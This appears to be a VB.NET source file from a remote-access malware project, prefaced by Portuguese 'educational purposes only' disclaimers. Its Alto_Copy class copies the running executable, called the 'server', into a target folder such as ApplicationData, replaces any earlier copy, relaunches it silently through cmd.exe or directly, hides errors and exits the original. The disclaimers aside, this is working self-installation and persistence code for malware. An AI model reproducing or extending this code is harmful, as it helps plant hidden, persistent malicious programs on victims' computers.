﻿
'!!!!!!!!!!!! Atenção codigo feito com propócito educativo !!!!!!!!!!!!!!
'!!!!!!!!!!!! Não me responsabiliso pelos seus atos !!!!!!!!!!!!!!!!!!!!!
'!!!!!!!!!!!! Apenas para proposito educativos "educacionais" '!!!!!!!!!!
'!!!!!!!!!!!! Use de forma correta perante a lei! Por favor !!!!!!!!!!!!!

Imports System.IO
Imports Microsoft.MicrosoftClass.Microsoft
Imports Microsoft.AmaisClass.Amais


Namespace Alto_CopyClass
    Public Class Alto_Copy

        Public Shared Sub Copy_Dir(ByVal Dir As String, ByVal Modo As String) 'copy server ApplicationData
            Try
                If Directory.Exists(Dir).Equals(False) Then
                    Directory.CreateDirectory(Dir)
                End If

                If File.Exists(Dir & "\" & Namer_Server) Then 'verificar se server Exist
                    Call File.SetAttributes(Dir & "\" & Namer_Server, FileAttributes.Normal) 'normal server 
                    Call File.Delete(Dir & "\" & Namer_Server) 'delete server
                    Call File.Copy(Mylocation.FullName, Dir & "\" & Namer_Server) 'copy server
                Else
                    Call File.Copy(Mylocation.FullName, Dir & "\" & Namer_Server) 'copy server
                End If

                If Modo.Equals("Shell") Then 'start usando cmd
                    Call Cmd((Environ("systemroot") & "\system32").ToString, "cmd.exe",
                    "/c start " & """" & """" & " /d " & """" & Dir & """" & " " & """" & Namer_Server & """" & " & exit", True)
                ElseIf Modo.Equals("Start") Then 'start normal
                    Call Cmd(Dir, Namer_Server, String.Empty, True)
                End If
            Catch ex As Exception
            End Try

            Call Endpp()
        End Sub

    End Class

End Namespace